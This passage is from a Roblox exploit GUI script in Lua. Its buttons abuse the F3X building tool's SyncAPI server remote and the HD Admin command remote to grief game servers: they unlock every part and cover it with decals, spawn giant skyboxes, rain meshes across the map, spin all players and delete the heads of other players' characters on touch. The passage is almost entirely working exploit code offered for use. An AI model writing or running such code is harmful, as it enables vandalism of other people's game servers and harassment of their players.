					CFrame = cf,
					Size = size
				}
			}
		})
	end

	function AddMesh(part)
		_({
			"CreateMeshes",
			{
				{ Part = part }
			}
		})
	end

	function SetMesh(part, meshid)
		_({
			"SyncMesh",
			{
				{ Part = part, MeshId = "rbxassetid://" .. meshid }
			}
		})
	end

	function SetTexture(part, texid)
		_({
			"SyncMesh",
			{
				{ Part = part, TextureId = "rbxassetid://" .. texid }
			}
		})
	end

	function MeshResize(part, size)
		_({
			"SyncMesh",
			{
				{ Part = part, Scale = size }
			}
		})
	end

	function SetName(part, stringg)
		_({
			"SetName",
			{ part },
			stringg
		})
	end

	function Sky(id)
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).magnitude < 1 then
				SetAnchor(true, v)
				AddMesh(v)
				SetMesh(v, "14832966960")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(0, 0, 0))
			end
		end
	end

	local function createRainToads()
		while true do
			task.wait(0.1)
			if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
				local hrpcf = player.Character.HumanoidRootPart.CFrame
				local x = hrpcf.X
				local z = hrpcf.Z
				local xloc = math.random(-600, 600) + x
				local zloc = math.random(-600, 600) + z
				local yloc = hrpcf.Y + 400

				spawn(function()
					CreatePart(CFrame.new(math.floor(xloc), math.random(yloc, yloc + 400), math.floor(zloc)))
					for _, v in workspace:GetDescendants() do
						if v:IsA("BasePart") and v.Position.X == math.floor(xloc) and v.Position.Z == math.floor(zloc) then
							SetName(v, "MEHRIO")
							SetAnchor(false, v)
							AddMesh(v)
							Resize(v, Vector3.new(50, 80, 50), v.CFrame)
							MeshResize(v, Vector3.new(100.695, 140.148, 100))
							SetMesh(v, "554947956")
							SetTexture(v, "554947969")
							SetCollision(v, true)
							v.Orientation = Vector3.new(0, 0, 0)

							local sound = Instance.new("Sound", v)
							sound.SoundId = "rbxassetid://153752123"
							sound.Volume = 0
							sound.PlayOnRemove = true
							sound:Destroy()
						end
					end
				end)
			else
				task.wait(1)
			end
		end
	end

	coroutine.wrap(createRainToads)()
	Sky("9453746978")
end)



local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.772, 0,0.336, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "rain rock"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("SyncAPI não encontrado")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		_({
			"SyncCollision",
			{
				{ Part = part, CanCollide = boolean }
			}
		})
	end

	function SetAnchor(boolean, part)
		_({
			"SyncAnchor",
			{
				{ Part = part, Anchored = boolean }
			}
		})
	end

	function CreatePart(cf)
		_({ "CreatePart", "Normal", cf, workspace })
	end

	function Resize(part, size, cf)
		_({
			"SyncResize",
			{
				{ Part = part, CFrame = cf, Size = size }
			}
		})
	end

	function AddMesh(part)
		_({ "CreateMeshes", { { Part = part } } })
	end

	function SetMesh(part, meshid)
		_({
			"SyncMesh",
			{
				{ Part = part, MeshId = "rbxassetid://" .. meshid }
			}
		})
	end

	function SetTexture(part, texid)
		_({
			"SyncMesh",
			{
				{ Part = part, TextureId = "rbxassetid://" .. texid }
			}
		})
	end

	function MeshResize(part, size)
		_({
			"SyncMesh",
			{
				{ Part = part, Scale = size }
			}
		})
	end

	function SetName(part, stringg)
		_({
			"SetName",
			{ part },
			stringg
		})
	end

	function Sky(id)
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).magnitude < 1 then
				SetAnchor(true, v)
				AddMesh(v)
				SetMesh(v, "14832966960")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(0, 0, 0))
			end
		end
	end

	local function createRainToads()
		while true do
			task.wait(0.1)
			if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
				local hrpcf = player.Character.HumanoidRootPart.CFrame
				local x = hrpcf.X
				local z = hrpcf.Z
				local xloc = math.random(-600, 600) + x
				local zloc = math.random(-600, 600) + z
				local yloc = hrpcf.Y + 400

				spawn(function()
					CreatePart(CFrame.new(math.floor(xloc), math.random(yloc, yloc + 400), math.floor(zloc)))
					for _, v in workspace:GetDescendants() do
						if v:IsA("BasePart") and v.Position.X == math.floor(xloc) and v.Position.Z == math.floor(zloc) then
							SetName(v, "Graphite in minecraft")
							SetAnchor(false, v)
							AddMesh(v)
							Resize(v, Vector3.new(50, 50, 30), v.CFrame)
							MeshResize(v, Vector3.new(15, 15, 15))
							SetMesh(v, "104620651021769")
							SetTexture(v, "9453746978")
							SetCollision(v, true)

							local sound = Instance.new("Sound", v)
							sound.SoundId = "rbxassetid://153752123"
							sound.Volume = 0
							sound.PlayOnRemove = true
							sound:Destroy()
						end
					end
				end)
			else
				task.wait(1)
			end
		end
	end

	coroutine.wrap(createRainToads)()
	Sky("9453746978")


end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.056, 0,0.372, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Thomas"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("SyncAPI não encontrado!")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function _(args)
		remote:InvokeServer(unpack(args))
	end

	local function SetCollision(part, boolean)
		_({ "SyncCollision", { { Part = part, CanCollide = boolean } } })
	end

	local function SetAnchor(boolean, part)
		_({ "SyncAnchor", { { Part = part, Anchored = boolean } } })
	end

	local function CreatePart(cf, parent)
		_({ "CreatePart", "Normal", cf, parent })
	end

	local function DestroyPart(part)
		_({ "Remove", { part } })
	end

	local function MovePart(part, cf)
		_({ "SyncMove", { { Part = part, CFrame = cf } } })
	end

	local function Resize(part, size, cf)
		_({ "SyncResize", { { Part = part, CFrame = cf, Size = size } } })
	end

	local function AddMesh(part)
		_({ "CreateMeshes", { { Part = part } } })
	end

	local function SetMesh(part, meshid)
		_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://"..meshid } } })
	end

	local function SetTexture(part, texid)
		_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://"..texid } } })
	end

	local function SetName(part, name)
		_({ "SetName", { part }, name })
	end

	local function MeshResize(part, size)
		_({ "SyncMesh", { { Part = part, Scale = size } } })
	end

	local function Weld(part1, part2, lead)
		_({ "CreateWelds", { part1, part2 }, lead })
	end

	local function SetLocked(part, boolean)
		_({ "SetLocked", { part }, boolean })
	end

	local function SetTrans(part, transparency)
		_({ "SyncMaterial", { { Part = part, Transparency = transparency } } })
	end

	local function CreateSpotlight(part)
		_({ "CreateLights", { { Part = part, LightType = "SpotLight" } } })
	end

	local function SyncLighting(part, brightness)
		_({ "SyncLighting", { { Part = part, LightType = "SpotLight", Brightness = brightness } } })
	end

	local function xd()
		spawn(function()
			local parts = {
				char:FindFirstChild("Torso"),
				char:FindFirstChild("Left Leg"),
				char:FindFirstChild("HumanoidRootPart"),
				char:FindFirstChild("Right Leg"),
				char:FindFirstChild("Right Arm"),
				char:FindFirstChild("Left Arm"),
				char:FindFirstChild("Head")
			}
			local args = { "SyncMaterial", {} }
			for _, part in pairs(parts) do
				if part then
					table.insert(args[2], { Part = part, Transparency = 1 })
				end
			end
			_(args)
		end)
	end

	local function SFX(id)
		local s = Instance.new("Sound", char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or char)
		s.SoundId = "rbxassetid://"..id
		s.Volume = 1
		return s
	end

	local function Thomas(player)
		local hrp = char:WaitForChild("HumanoidRootPart")
		SetAnchor(true, hrp)
		CreatePart(hrp.CFrame, char)
		local thomasPart = char:FindFirstChild("Part")
		if not thomasPart then warn("Part não criada!") return end

		SetCollision(thomasPart, false)
		SetLocked(thomasPart, false)
		Resize(thomasPart, Vector3.new(5, 5, 10), hrp.CFrame)
		CreateSpotlight(thomasPart)
		SyncLighting(thomasPart, 100)
		SetLocked(hrp, false)
		Weld(thomasPart, hrp, thomasPart)
		SetAnchor(false, thomasPart)
		AddMesh(thomasPart)
		MeshResize(thomasPart, Vector3.new(2, 2, 1.5))
		SetMesh(thomasPart, "2231280549")
		SetTexture(thomasPart, "2231280614")
		SetAnchor(false, hrp)

		char.Humanoid.WalkSpeed = 80

		thomasPart.Touched:Connect(function(p)
			local touchedPlayer = game.Players:FindFirstChild(p.Parent and p.Parent.Name)
			if touchedPlayer and touchedPlayer ~= player then
				local targetChar = touchedPlayer.Character
				if targetChar and targetChar:FindFirstChild("Head") then
					DestroyPart(targetChar.Head)
					local Whistle = SFX(475073913)
					Whistle:Play()
				end
			end
		end)

		local Music = SFX(0)
		Music.Pitch = 1.15
		Music:Play()

		game:GetService("RunService").RenderStepped:Connect(function()
			for _, v in ipairs(char:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CanCollide = false
					char.Humanoid.WalkSpeed = 80
				end
			end
		end)
	end

	Thomas(player)
	xd()
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.195, 0,0.372, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Eagles2212 Skybox 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color,
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				SetName(v,"Skybox")
				AddMesh(v)
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				MeshResize(v,Vector3.new(7200, 7200, 7200))
				SetLocked(v,true)
			end
		end
	end
	Sky("110569217428911")


end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.337, 0,0.371, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Eagles2212 Decal 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("Tool com SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function _(args)
		remote:InvokeServer(unpack(args))
	end



	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end

	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end

	function spam(id)
		for i,v in workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end


	spam("110569217428911") 
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.48, 0,0.374, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Decal 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.TextScaled = true
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("Tool com SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function _(args)
		remote:InvokeServer(unpack(args))
	end



	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end

	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end

	function spam(id)
		for i,v in workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end


	spam("70767407415502") 
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.631, 0,0.375, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Cat Skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.TextScaled = true
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color,
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				SetName(v,"Skybox")
				AddMesh(v)
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				MeshResize(v,Vector3.new(7200, 7200, 7200))
				SetLocked(v,true)
			end
		end
	end
	Sky("124185341090709")


end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.772, 0,0.375, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Cat Decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 11
f3x.TextScaled = true
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		warn("Tool com SyncAPI não encontrado.")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function _(args)
		remote:InvokeServer(unpack(args))
	end



	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}
		_(args)
	end

	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end

	function spam(id)
		for i,v in workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end


	spam("124185341090709") 
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.056, 0,0.408, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Spin All"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 26
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Spin All 99")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.195, 0,0.409, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Savemap"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 26
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Savemap")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.337, 0,0.409, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Loadmap"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 26
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";loadmap")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.48, 0,0.411, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Chat all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 26
f3x.Parent = mainFrame

